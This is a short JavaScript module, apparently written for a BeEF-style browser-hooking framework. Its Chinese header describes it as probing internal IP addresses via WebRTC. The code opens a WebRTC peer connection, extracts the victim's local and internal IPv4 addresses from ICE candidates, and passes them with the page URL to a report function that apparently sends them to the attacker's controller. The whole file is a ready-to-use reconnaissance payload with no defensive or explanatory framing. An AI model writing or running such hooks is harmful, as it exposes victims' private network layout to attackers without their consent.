// MODULE = {"desc": "内网 IP 探测:WebRTC 泄漏本地/内网 IP(BeEF get_internal_ip_webrtc)", "category": "网络", "params": []}
(function () {
  var ips = [];
  function done() {
    report({ type: "net", url: location.href, ips: ips });
  }
  try {
    var RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
    if (!RTCPeerConnection) { done(); return; }
    var pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel('');
    pc.onicecandidate = function (e) {
      if (!e.candidate) { done(); return; }
      var m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate || '');
      if (m && ips.indexOf(m[1]) === -1) { ips.push(m[1]); }
    };
    pc.createOffer().then(function (o) { pc.setLocalDescription(o); }).catch(function () {});
    setTimeout(done, 2500);
  } catch (e) {
    done();
  }
})();
